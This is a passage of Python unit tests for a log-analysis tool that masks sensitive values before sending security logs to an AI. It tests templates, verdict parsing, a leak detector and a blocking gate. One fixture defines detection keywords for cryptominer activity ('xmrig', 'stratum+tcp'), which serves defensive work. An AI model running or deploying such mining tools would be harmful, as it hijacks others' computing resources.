        with open(tpl.STORE_FILE, encoding="utf-8") as f:
            backup = f.read()
    try:
        if os.path.exists(tpl.STORE_FILE):
            os.remove(tpl.STORE_FILE)
        tpl.reload()

        # Edit a built-in -> override persists, flagged modified.
        r = tpl.save_template("brute_force", {"prompt": "Custom BF prompt"})
        check("builtin edit applied", r["prompt"] == "Custom BF prompt")
        check("builtin edit flagged modified", r["modified"] is True)
        check("builtin edit persists",
              tpl.get_template("brute_force")["prompt"] == "Custom BF prompt")

        # Reset -> restores the default and clears the flag.
        tpl.reset_template("brute_force")
        check("builtin reset restores default",
              tpl.get_template("brute_force")["prompt"].startswith("Investigate"))
        check("builtin reset clears modified",
              tpl.get_template("brute_force")["modified"] is False)

        # Empty prompt is rejected.
        try:
            tpl.save_template("brute_force", {"prompt": "   "})
            check("empty prompt rejected", False)
        except ValueError:
            check("empty prompt rejected", True)

        # Create a custom template with keywords -> auto-suggests.
        c = tpl.create_template({"name": "Crypto Mining", "prompt": "Find miners",
                                 "technique_id": "T1496",
                                 "keywords": ["xmrig", "stratum+tcp"]})
        check("custom created", c["custom"] is True)
        check("custom in list", any(t["id"] == c["id"] for t in tpl.list_templates()))
        sug = tpl.suggest("worker connected to stratum+tcp pool, xmrig running")
        check("custom template auto-suggested", sug and sug[0]["id"] == c["id"])

        # Built-ins can't be deleted; custom can.
        try:
            tpl.delete_template("brute_force")
            check("builtin delete blocked", False)
        except ValueError:
            check("builtin delete blocked", True)
        tpl.delete_template(c["id"])
        check("custom deleted", not any(t["id"] == c["id"]
                                        for t in tpl.list_templates()))
    finally:
        if backup is None:
            if os.path.exists(tpl.STORE_FILE):
                os.remove(tpl.STORE_FILE)
        else:
            with open(tpl.STORE_FILE, "w", encoding="utf-8") as f:
                f.write(backup)
        tpl.reload()


def test_verdict_parsing():
    import json
    import verdict as v
    resp = (
        "The source [IP_1] failed 412 logons against [USER_1] then succeeded.\n\n"
        "```json\n"
        "{\n"
        '  "verdict": "True-Positive",\n'
        '  "confidence": "HIGH",\n'
        '  "severity": "High",\n'
        '  "summary": "Successful brute force against [USER_1] from [IP_1].",\n'
        '  "mitre": [{"tactic":"Credential Access","technique":"Brute Force",'
        '"technique_id":"T1110"}],\n'
        '  "iocs": [{"type":"ip","value":"[IP_1]","context":"source"}],\n'
        '  "affected_entities": ["[USER_1]","[HOST_1]"],\n'
        '  "recommended_actions": ["Reset [USER_1] password","Block [IP_1]"],\n'
        '  "next_steps": []\n'
        "}\n"
        "```"
    )
    prose, parsed = v.split_response(resp)
    check("verdict block stripped from prose", "```json" not in prose)
    check("prose retained", "failed 412 logons" in prose)
    check("verdict value normalized", parsed["verdict"] == "true_positive")
    check("confidence normalized", parsed["confidence"] == "high")
    check("severity normalized", parsed["severity"] == "high")
    check("mitre parsed", parsed["mitre"][0]["technique_id"] == "T1110")
    check("empty arrays preserved", parsed["next_steps"] == [])

    mapping = {"[IP_1]": "203.0.113.5", "[USER_1]": "j.smith",
               "[HOST_1]": "WS-FIN-07"}
    rest = v.restore(parsed, masker.unmask, mapping)
    check("ioc value restored", rest["iocs"][0]["value"] == "203.0.113.5")
    check("action restored", rest["recommended_actions"][0] == "Reset j.smith password")
    check("entities restored", rest["affected_entities"] == ["j.smith", "WS-FIN-07"])
    # placeholders must NOT survive into the structured verdict
    blob = json.dumps(rest)
    check("no placeholders left in verdict", "[IP_1]" not in blob and "[USER_1]" not in blob)


def test_verdict_robustness():
    import verdict as v
    p, none = v.split_response("Just prose, no structured verdict.")
    check("no verdict -> None", none is None)
    check("prose unchanged", p == "Just prose, no structured verdict.")
    _, broken = v.split_response("text\n```json\n{not valid,}\n```")
    check("broken json -> None", broken is None)
    # bare object (no fences) still recognised
    _, bare = v.split_response('{"verdict":"false_positive","summary":"benign"}')
    check("bare json verdict parsed", bare and bare["verdict"] == "false_positive")
    # unknown verdict value coerced to inconclusive
    _, weird = v.split_response('```json\n{"verdict":"maybe?"}\n```')
    check("unknown verdict coerced", weird["verdict"] == "inconclusive")


def test_leakguard_detectors():
    import leakguard as lg
    # A typical fully-masked output must be silent (no alert fatigue).
    clean = ("Jun 10 14:23:01 [HOST_1] %ASA-6-605005: Login from [IP_1]/51122 "
             "for user '[USER_1]'\nUTF-8 CVE-2024-1234 T1110 SHA-256 "
             "[APIKEY_1] [CUSTOMERID_1] HTTP/1.1 200 OK")
    check("leakguard silent on clean text", lg.scan(clean) == [])
    # Partially-masked value -> high.
    f = lg.scan("login [USER_1] from j.smith desk", {"[USER_1]": "j.smith"})
    check("known value leftover high", f and f[0]["severity"] == "high"
          and f[0]["type"] == "known_value")
    # Custom term leftover -> high (case-insensitive).
    f = lg.scan("deploy Project-Falcon now", custom_terms=["project-falcon"])
    check("custom term leftover high", f and f[0]["type"] == "custom_term")
    # IP / email leftovers -> high; suppressed when category is off by choice.
    check("ip leftover high",
          lg.scan("from 203.0.113.5")[0]["type"] == "ip_address")
    check("ip ignored when network off",
          lg.scan("from 203.0.113.5", enabled=["identities"]) == [])
    check("email leftover high",
          lg.scan("to bob@acme-corp.com")[0]["type"] == "email")
    # Secret-ish and host-ish -> medium (advisory, non-blocking).
    f = lg.scan("token Zk9qP2xT7mB4vQ8sW1yD3aF6h on WS-FIN-07")
    types = {x["type"] for x in f}
    check("secret-like flagged", "secret_like" in types)
    check("host-like flagged", "host_like" in types)
    check("mediums do not block", lg.has_blocking(
        lg.scan("copy from WS-FIN-07 share")) is False)
    check("highs block", lg.has_blocking(lg.scan("from 203.0.113.5")) is True)
    # Numeric / short mapping values never flagged (the "0" lesson).
    check("short numeric mapping ignored",
          lg.scan("count 0 and 0 again", {"[DOMAIN_1]": "0"}) == [])


def test_leakguard_gate():
    """The /analyze gate blocks when masking is broken (e.g. a bad regex
    override), and proceeds + audits once acknowledged."""
    import app as appmod
    import masker as mk
    import os

    real_call, real_key = appmod.providers.call, appmod.get_api_key
    backup = None
    if os.path.exists(mk.OVERRIDES_FILE):
        with open(mk.OVERRIDES_FILE, encoding="utf-8") as f:
            backup = f.read()
    try:
        appmod.providers.call = (lambda *a, **k: "Analysis done. All fine.")
        appmod.get_api_key = lambda provider: "stub-key"
        # Sabotage the IPv4 pattern the way a careless edit could.
        mk.set_builtin_pattern("ipv4", r"ZZZ-NEVER-MATCHES")

        convs_before = set(appmod.CONVERSATIONS)
        audit_before = len(appmod.REQUEST_LOG)
        req = appmod.AnalyzeRequest(
            logs="conn from 203.0.113.5 ok", structured=False)
        res = appmod.analyze(req)
        check("gate blocks on unmasked ip", res.get("blocked") is True)
        check("gate reports the finding",
              res["warnings"][0]["type"] == "ip_address")
        check("blocked: no conversation created",
              set(appmod.CONVERSATIONS) == convs_before)
        check("blocked: nothing sent, nothing audited",
              len(appmod.REQUEST_LOG) == audit_before)

        res2 = appmod.analyze(appmod.AnalyzeRequest(
            logs="conn from 203.0.113.5 ok", structured=False,
            acknowledge_leaks=True))
        check("acknowledged send proceeds", res2.get("blocked") is None
              and res2["ai_response_restored"].startswith("Analysis done"))
        check("acknowledgement audited",
              appmod.REQUEST_LOG[-1].get("leakguard", {}).get("acknowledged")
              is True)
        appmod.CONVERSATIONS.pop(res2["conversation_id"], None)

        # With masking healthy again, the same log passes silently.
        mk.reset_builtin_pattern("ipv4")
        res3 = appmod.analyze(appmod.AnalyzeRequest(
            logs="conn from 203.0.113.5 ok", structured=False))
        check("healthy masking passes gate", res3.get("blocked") is None
              and res3["warnings"] == [])
        appmod.CONVERSATIONS.pop(res3["conversation_id"], None)
    finally:
        appmod.providers.call = real_call
        appmod.get_api_key = real_key
        if backup is None:
            if os.path.exists(mk.OVERRIDES_FILE):
                os.remove(mk.OVERRIDES_FILE)
        else:
            with open(mk.OVERRIDES_FILE, "w", encoding="utf-8") as f:
                f.write(backup)
        mk.reload_patterns()


def _backup_file(path):
    import os
    if os.path.exists(path):
        with open(path, encoding="utf-8") as f:
            return f.read()
    return None


def _restore_file(path, content):
    import os
    if content is None:
        if os.path.exists(path):
            os.remove(path)
    else:
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)


def test_custom_store():
    """The global custom-terms / saved-patterns store persists and feeds
    masking, and those saved terms apply automatically at analyse time."""
    import os
    import app as appmod
    import store
    # Back up the store and the legacy files migration would read from, so the
    # empty-start assertion is not satisfied by pre-existing user data.
    backups = {f: _backup_file(f) for f in (
        store.STORE_FILE, store.LEGACY_PATTERNS_FILE, store.LEGACY_WORKSPACES_FILE)}
    real_call, real_key = appmod.providers.call, appmod.get_api_key
    try:
        for f in backups:
            if os.path.exists(f):
                os.remove(f)
        check("store starts empty", store.get_terms() == []
              and store.get_patterns() == [])

        store.set_terms(["Acme Corp", "Acme Corp", "  "])
        check("terms deduped + trimmed", store.get_terms() == ["Acme Corp"])

        store.add_pattern("TICKET", r"INC\d{7}")
        check("pattern saved",
              store.get_patterns() == [{"label": "TICKET", "regex": r"INC\d{7}"}])
        try:
            store.add_pattern("DUP", r"INC\d{7}")
            check("duplicate regex rejected", False)
        except ValueError:
            check("duplicate regex rejected", True)
        store.delete_pattern(0)
        check("pattern deleted", store.get_patterns() == [])

        # Saved terms apply at analyse time without being passed in the request.
        appmod.providers.call = (lambda *a, **k: "Looks fine.")
        appmod.get_api_key = lambda provider: "stub-key"
        store.set_terms(["falcon-project"])
        res = appmod.analyze(appmod.AnalyzeRequest(
            logs="login user=jsmith on falcon-project box", structured=False))
        check("saved terms applied at mask time",
              "falcon-project" not in res["masked_sent"])
        appmod.CONVERSATIONS.pop(res["conversation_id"], None)
    finally:
        appmod.providers.call = real_call
        appmod.get_api_key = real_key
        for f, content in backups.items():
            _restore_file(f, content)


def test_system_prompt():
    """The system prompt is editable + persisted, and the per-run toggle
    controls whether it (and the saved override) are sent to the AI."""
    import app as appmod
    backup = _backup_file(appmod.CONFIG_FILE)
    captured = {}

    def fake_call(provider, api_key, model, system, messages, cfg, **k):
        captured["system"] = system
        return "ok"

    real_call, real_key = appmod.providers.call, appmod.get_api_key
    try:
        appmod.providers.call = fake_call
        appmod.get_api_key = lambda provider: "stub-key"

        # Default prompt when nothing saved.
        appmod.reset_system_prompt()
        d = appmod.get_system_prompt_route()
        check("default prompt when unset", not d["is_custom"]
              and d["prompt"] == appmod.DEFAULT_SYSTEM_PROMPT)

        # Save a custom prompt and confirm it persists + is used.
        appmod.save_system_prompt(appmod.SystemPromptRequest(prompt="ROBOT analyst."))
        check("custom prompt persisted",
              appmod.get_system_prompt_route()["is_custom"])

        # vault_context off: these checks assert the EXACT system string, and
        # a repeated value would otherwise append cross-incident context.
        res = appmod.analyze(appmod.AnalyzeRequest(
            logs="user=jsmith from 10.0.0.1", structured=False, use_system=True,
            vault_context=False))
        appmod.CONVERSATIONS.pop(res["conversation_id"], None)
        check("custom system prompt sent", captured["system"] == "ROBOT analyst.")

        # Toggle off: no system prompt sent (only instructions, if any).
        res = appmod.analyze(appmod.AnalyzeRequest(
            logs="user=jsmith from 10.0.0.1", structured=False, use_system=False,
            vault_context=False))
        appmod.CONVERSATIONS.pop(res["conversation_id"], None)
        check("system prompt suppressed when toggled off", captured["system"] == "")

        # Empty prompt rejected.
        try:
            appmod.save_system_prompt(appmod.SystemPromptRequest(prompt="   "))
            check("empty system prompt rejected", False)
        except Exception:
            check("empty system prompt rejected", True)

        # Reset restores the default.
        appmod.reset_system_prompt()
        check("reset clears custom prompt",
              not appmod.get_system_prompt_route()["is_custom"])
    finally:
        appmod.providers.call = real_call
        appmod.get_api_key = real_key
        _restore_file(appmod.CONFIG_FILE, backup)


if __name__ == "__main__":
    test_roundtrip()
    test_ipv6_vs_timestamp()
    test_bare_hostname_param()
    test_custom_terms()
    test_stable_placeholders()
    test_category_toggle()
    test_no_false_positive_filenames()
    test_windows_event_log()
    test_network_device_logs()
    test_sysmon_logs()
    test_sysmon_xml()
    test_qradar_logs()
    test_linux_os_logs()
    test_cloud_json_logs()
    test_appliance_logs()
    test_vmware_and_proxy_logs()
    test_endpoint_security_logs()
    test_network_security_logs()
    test_azure_firewall_and_fp()
    test_dns_mail_infra_logs()
    test_wazuh_logs()
    test_squid_and_watchguard_logs()
    test_qradar_offense_csv()
    test_custom_patterns()
    test_custom_patterns_persistence()
    test_conversation_mapping()
    test_custom_term_priority()
    test_builtin_overrides()
    test_template_library()
    test_template_suggestion()
    test_template_editing()
    test_verdict_parsing()
    test_verdict_robustness()
    test_leakguard_detectors()
    test_leakguard_gate()
    test_custom_store()
    test_system_prompt()
    print("\nAll masker tests passed.")
